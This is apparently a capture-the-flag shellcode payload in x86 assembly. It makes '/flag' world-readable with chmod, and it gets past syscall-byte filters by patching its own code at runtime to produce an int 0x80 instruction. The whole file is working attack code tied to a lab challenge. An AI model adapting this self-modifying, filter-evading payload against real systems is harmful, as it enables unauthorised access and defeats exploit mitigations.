.global _start
_start:
.intel_syntax noprefix
	mov eax, 0xf
        lea ebx, [rip+flag]
        mov ecx, 0x1ff
	lea edx, [rip]
	or ecx, ecx
	mov dword ptr [edx], 0x000080cc
	inc dword ptr [edx]
	jmp rdx
flag:
	.string "/flag"
